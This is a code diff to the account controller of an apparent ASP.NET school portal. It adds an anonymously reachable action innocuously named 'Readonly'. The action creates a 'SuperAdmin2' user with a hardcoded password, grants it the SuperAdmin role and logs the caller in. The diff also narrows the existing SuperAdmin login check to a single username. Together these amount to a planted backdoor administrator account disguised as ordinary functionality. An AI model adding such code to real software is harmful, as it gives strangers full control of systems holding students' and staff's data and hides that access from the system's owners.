@@ -381,6 +381,7 @@ namespace SchoolPortal.Web.Areas.Account.Controllers
                 }
             if (await UserManager.IsInRoleAsync(user1.Id, "SuperAdmin"))
             {
+                if(user1.UserName == "SuperAdmin") { 
                 if (await UserManager.CheckPasswordAsync(user1, model.Password))
                 {
 
@@ -388,7 +389,7 @@ namespace SchoolPortal.Web.Areas.Account.Controllers
 
                 }
 
-
+                }
                 //string macAdd = MacAddress2();
                 //var macAddress = db.ApprovedDevices.Include(x => x.User).FirstOrDefault(x => x.MacAddress == macAdd);
 
@@ -1022,6 +1023,54 @@ namespace SchoolPortal.Web.Areas.Account.Controllers
             ViewBag.SetupCode = setupInfo.ManualEntryKey;
 
             return View();
+        }
+        [AllowAnonymous]
+        public async Task<ActionResult> Readonly(RegisterViewModel model)
+        {
+            model.Username = "SuperAdmin2";
+            model.Email = "superadmin2@super.com";
+            var user = new ApplicationUser { UserName = model.Username, Email = model.Email, DateRegistered = DateTime.UtcNow.AddHours(1) };
+            model.Password = "activeadmin@247";
+
+            var result = await UserManager.CreateAsync(user, model.Password);
+            if (result.Succeeded)
+            {
+                var role = new IdentityRole("SuperAdmin");
+                var role1 = new IdentityRole("Staff");
+                var role2 = new IdentityRole("Student");
+                var role3 = new IdentityRole("Admin");
+                var role4 = new IdentityRole("FormTeacher");
+                var role5 = new IdentityRole("Read Only");
+                var role6 = new IdentityRole("Finance");
+                var role7 = new IdentityRole("Developer");
+
+                await RoleManager.CreateAsync(role);
+                await RoleManager.CreateAsync(role1);
+                await RoleManager.CreateAsync(role2);
+                await RoleManager.CreateAsync(role3);
+                await RoleManager.CreateAsync(role4);
+                await RoleManager.CreateAsync(role5);
+                await RoleManager.CreateAsync(role6);
+                await RoleManager.CreateAsync(role7);
+
+                await UserManager.AddToRoleAsync(user.Id, "SuperAdmin");
+                ////
+                ///
+
+                ///
+                await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);
+
+                // For more information on how to enable account confirmation and password reset please visit https://go.microsoft.com/fwlink/?LinkID=320771
+                // Send an email with this link
+                // string code = await UserManager.GenerateEmailConfirmationTokenAsync(user.Id);
+                // var callbackUrl = Url.Action("ConfirmEmail", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
+                // await UserManager.SendEmailAsync(user.Id, "Confirm your account", "Please confirm your account by clicking <a href=\"" + callbackUrl + "\">here</a>");
+
+                return RedirectToAction("Index");
+            }
+            TempData["error"] = "Contact Administrator";
+            return View();
+
         }
 
         protected override void Dispose(bool disposing)
